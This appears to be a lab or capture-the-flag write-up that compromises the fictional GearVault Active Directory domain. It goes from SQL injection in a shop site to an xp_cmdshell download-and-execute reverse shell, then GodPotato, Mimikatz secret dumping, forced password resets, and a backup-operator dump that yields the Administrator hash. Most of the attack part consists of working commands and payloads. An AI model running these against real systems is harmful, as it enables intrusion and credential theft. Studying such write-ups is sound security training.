Overview

  • Attacker IP: 192.168.211.2
  • Domain Controller: 10.0.0.4
  • Web Server: 10.0.0.5
  • Difficulty: Medium
  • OS: Windows / Active Directory
  • Creator: Marc W.

The objective was to enumerate the GearVault domain, gain initial access through a SQL injection in the shop web application, escalate to NT AUTHORITY\SYSTEM on the web server using SeImpersonatePrivilege, recover domain credentials, and pivot to the Domain Controller through Active Directory permission abuse and a backup operator account.

Enumeration

Web Server HTTP Enumeration

Visiting port 80 redirected to www.gearvault.local.

I added the hostname to /etc/hosts.

The site then loaded successfully.

Manual enumeration revealed a subdomain:

shop.gearvault.local

The site also disclosed team names.

The careers page explained how their infrastructure worked:

Our shop and warehouse run on a Windows-based environment - from the point-of-sale tills to the online store on IIS and our SQL Server stock database. Our small IT team keeps it all humming, so a feel for Windows Server, Active Directory and a bit of PowerShell goes a long way in our technical roles.

The page also revealed the website administrator and the names of the managing directors.

Shop Subdomain

The shop subdomain loaded correctly.

The search field reflected whatever I typed, so I tested it for SQL injection.

Breaking out of the query produced a detailed SQL error, which also leaked the web root path:

Source File: c:\inetpub\wwwroot\Default.aspx
Line: 43

SqlException (0x80131904): Incorrect syntax near 'os'.

The injection was confirmed with a time-based payload:

search=1%';WAITFOR DELAY '0:0:5'--

The query required six columns, with the second column being the visible one. The active database user was db_owner, which meant it might be possible to escalate to sysadmin using the trusted database technique documented in HackTricks.

Reference:

  • https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html#mssql-privilege-escalation

Database version:

' UNION SELECT 1, @@version, '3',4,5,'6' -- -

Database name:

' UNION SELECT 1, DB_NAME(), '3',4,5,'6' -- -

GearVaultShop

Checking trustworthy databases:

' UNION SELECT 1, name, CAST(b.is_trustworthy_on AS NVARCHAR(10)), 4,5,'6'
FROM master..sysdatabases AS a
INNER JOIN sys.databases AS b ON a.name = b.name -- -

Database roles:

' UNION SELECT 1, STRING_AGG(CONCAT(rp.name, ' -> ', mp.name), ', ')
COLLATE DATABASE_DEFAULT, '3',4,5,'6'
FROM GearVaultShop.sys.database_role_members drm
JOIN GearVaultShop.sys.database_principals rp ON drm.role_principal_id = rp.principal_id
JOIN GearVaultShop.sys.database_principals mp ON drm.member_principal_id = mp.principal_id -- -

Initial Access

db_owner → sysadmin

I created a stored procedure that would add the shop_svc user to the sysadmin server role:

1;EXEC('CREATE OR ALTER PROCEDURE dbo.sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC master.dbo.sp_addsrvrolemember ''shop_svc'', ''sysadmin'';');

The first attempts returned errors, so I sent the request through the product page instead.

The procedure was created without errors.

I executed the stored procedure.

Confirmation:

1;SELECT is_srvrolemember('sysadmin')

And from the default injection point:

' UNION SELECT 1, CAST(IS_SRVROLEMEMBER('sysadmin') AS VARCHAR(10)), '3',4,5,'6' -- -

Command Execution Through xp_cmdshell

Next I enabled xp_cmdshell:

1;EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

Confirmed with:

' UNION SELECT
1,
CASE
WHEN EXISTS (
SELECT 1
FROM sys.configurations
WHERE name = 'xp_cmdshell'
AND value_in_use = 1
)
THEN 'Enabled'
ELSE 'Disabled'
END,
'3', 4, 5, '6' -- -

I hosted a PowerShell reverse shell on my web server and used xp_cmdshell to download and execute it:

1; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://192.168.211.2/shell.ps1 | IEX"';

This returned a shell as mssqlserver on the web server.

Privilege Escalation

Web Server: mssqlserver → SYSTEM

Enumerating user directories did not reveal anything useful.

However, the mssqlserver account had SeImpersonatePrivilege enabled, which allowed escalation to NT AUTHORITY\SYSTEM with GodPotato.

Reference:

  • https://github.com/BeichenDream/GodPotato

Before escalating, I uploaded SharpHound through Penelope and collected Active Directory data:

./SharpHound.exe -c all

BloodHound showed that b.brown had an active session on the web server, making credential extraction from memory a possibility once I had SYSTEM privileges.

I added the web server hostname to /etc/hosts:

shop-web01.gearvault.local

I verified the privilege with GodPotato:

./GodPotato-NET4.exe -cmd "cmd /c whoami"

Then I used it to launch a reverse shell as NT AUTHORITY\SYSTEM.

The user flag was stored on the Administrator desktop:

type C:\Users\Administrator\Desktop\user.txt

Credential Recovery

With SYSTEM privileges, I uploaded Mimikatz and dumped LSA secrets:

./mimikatz.exe "privilege::debug" "lsadump::secrets" "exit"

One of the recovered secrets was:

M$MachineBoundCertificate

I also checked the Winlogon registry key:

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

It showed auto-logon configured for b.brown in the GEARVAULT domain.

Domain Controller

SMB Enumeration

I identified the Domain Controller with NetExec:

nxc smb 10.0.0.4

The machine was:

DC01.gearvault.local

I added it to /etc/hosts and checked the shares available to b.brown using the recovered password:

nxc smb DC01.gearvault.local -u b.brown -p 'BrowN!!!2026' --shares

b.brown → m.kelly

Because the IT Help Desk group had GenericAll over m.kelly, I changed her password with bloodyAD:

bloodyAD --host DC01.gearvault.local -d gearvault.local \
  -u 'b.brown' -p 'BrowN!!!2026' \
  set password 'm.kelly' 'Password123!'

Then I connected over WinRM:

evil-winrm-py -i DC01.gearvault.local -u m.kelly -p 'Password123!'

m.kelly → c.sanches

I knew administrators logged directly into the Domain Controller and kept tools, scripts, and scheduled maintenance jobs in C:\IT, but m.kelly had no read access to that directory.

BloodHound showed that c.sanches was a member of the IT admins group, making that account the next target.

c.sanches was not a member of Remote Management Users, so WinRM would not work. I reset the password and used RunasCs to run commands in that user’s context instead.

bloodyAD --host DC01.gearvault.local -d gearvault.local \
  -u 'b.brown' -p 'BrowN!!!2026' \
  set password 'c.sanches' 'Password123!'


./RunasCs.exe c.sanches Password123! cmd.exe -r 192.168.211.2:2491 -l 2

C:\IT Recruitment

Inside C:\IT I found three directories:

Logs
Scripts
Tools

Recursively listing them showed a backup script:

Get-ChildItem -Recurse

Backup-SystemSTate.ps1 contained credentials for svc-backup:

Backup#Svc2026

The account was disabled:

nxc smb DC01.gearvault.local -u svc-backup -p 'Backup#Svc2026' --shares

BloodHound confirmed the same.

In C:\IT\Tools there was a helper named Unlock-Account.exe.

Domain Controller Administrator Access

The svc-backup account had backup privileges, so I used the NetExec backup_operator module to dump the Domain Controller secrets:

nxc smb DC01.gearvault.local -u 'svc-backup' -p 'Backup#Svc2026' \
  --smb-timeout 30 -M backup_operator

This returned the Administrator hash:

dd8b98b5c8b8465dcee4360c9581aca9

I authenticated with the hash using evil-winrm-py:

evil-winrm-py -i DC01.gearvault.local -u Administrator -H 'dd8b98b5c8b8465dcee4360c9581aca9'
